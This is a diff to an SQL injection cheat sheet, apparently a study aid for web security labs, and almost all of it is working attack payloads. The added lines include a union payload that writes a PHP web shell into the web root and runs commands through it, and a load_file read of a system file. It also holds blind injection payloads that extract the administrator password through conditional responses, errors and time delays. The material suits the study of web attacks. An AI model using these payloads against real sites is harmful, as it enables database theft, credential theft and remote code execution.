@@ -1,3 +1,6 @@
+#!/usr/bin/peno
+#sqlinjection
+
 ' --
 '#
 ''
@@ -21,8 +24,17 @@
 'union select PASSWORD_PTFGTC,USERNAME_WANPPW from USERS_HPFCUW--					//Oracle
 
 
+#From SQL Injection to Code Execution
+http://10.11.0.22/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
+http://10.11.0.22/backdoor.php?cmd=id
 
-TrackingId=xyz' AND '1'='1													//Blind SQL injection with conditional responses
+
+#A SQL injection payload using the load_file function
+http://10.11.0.22/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
+
+
+#Blind SQL injection with conditional responses
+TrackingId=xyz' AND '1'='1		
 TrackingId=xyz' AND '1'='2
 TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
 TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
@@ -32,8 +44,9 @@ TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='a
 TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
 TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='§a§
 
+#Blind SQL injection with conditional errors
 
-TrackingId=xyz'															//Blind SQL injection with conditional errors
+TrackingId=xyz'
 TrackingId=xyz''
 TrackingId=xyz'||(SELECT '')||'
 TrackingId=xyz'||(SELECT '' FROM dual)||'
@@ -46,8 +59,9 @@ TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) EL
 TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
 
 
+# Blind SQL injection with time delays and information retrieval
 
-TrackingId=x'||pg_sleep(10)--													//Blind SQL injection with time delays and information retrieval
+TrackingId=x'||pg_sleep(10)--												
 TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
 TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
 TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
